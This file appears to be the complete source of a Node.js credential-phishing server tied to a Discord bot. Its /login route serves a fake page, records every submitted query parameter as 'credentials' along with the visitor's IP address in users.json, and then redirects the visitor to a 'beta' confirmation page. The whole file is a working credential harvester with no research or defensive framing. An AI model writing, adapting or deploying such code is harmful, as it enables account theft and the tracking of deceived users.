const { createServer } = require("http");
const users = require("./users.json");
const { writeFileSync, createReadStream, readFileSync } = require("fs");
const { Client } = require("discord.js");
const requestIp = require('request-ip');

const bot = new Client();
bot.login(readFileSync("token.txt", "utf-8"));

createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");

  const url = req.url.split("/").slice(1);
  if(url.includes("beta.png")) {
    res.writeHead(200, { "Content-Type": "image/png" });
    createReadStream("beta.png").pipe(res);
    return;
  }

  if(url.includes("style.css")) {
    res.writeHead(200, { "Content-Type": "text/css" });
    createReadStream("style.css").pipe(res);
    return;
  }

  if(url[0] == "login") {
    const id = url[1];
    let data = /\?(.+)/.exec(req.url);
    if(data) {
      data = new URLSearchParams(data[1]);
      users.push({
        id,
        credentials: [...data].reduce((o, [key, value]) => ({...o, [key]: value}), {}),
        ip: requestIp.getClientIp(req)
      });
      writeFileSync("users.json", JSON.stringify(users));
      res.writeHead(301, { "Location": "/beta" });
      res.end();
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html" });
    createReadStream("index.html").pipe(res);
    return;
  }

  if(url[0] == "beta") {
    res.writeHead(200, { "Content-Type": "text/html" });
    createReadStream("done.html").pipe(res);
    return;
  }

  res.writeHead(404);
  res.end();
}).listen(3000);

